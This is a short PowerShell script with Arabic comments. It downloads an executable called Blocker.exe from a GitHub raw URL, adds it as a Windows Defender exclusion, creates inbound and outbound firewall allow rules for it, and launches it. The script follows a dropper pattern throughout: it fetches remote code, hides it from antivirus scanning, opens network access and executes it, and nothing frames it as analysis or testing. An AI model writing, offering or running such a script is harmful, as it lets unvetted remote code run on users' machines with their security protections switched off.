$url = "https://raw.githubusercontent.com/spicetfy/cmd/main/Blocker.exe"
$outputPath = "$env:USERPROFILE\Downloads\Blocker.exe"

# تحميل الملف
Invoke-WebRequest -Uri $url -OutFile $outputPath

# إضافة الملف كاستثناء في مكافح الفيروسات
Add-MpPreference -ExclusionPath $outputPath

# السماح للبرنامج بالاتصال عبر جدار الحماية (صادر و وارد)
New-NetFirewallRule -DisplayName "Spicetfy Blocker Out" -Direction Outbound -Program $outputPath -Action Allow -Profile Any
New-NetFirewallRule -DisplayName "Spicetfy Blocker In" -Direction Inbound -Program $outputPath -Action Allow -Profile Any

# تشغيل البرنامج
Start-Process -FilePath $outputPath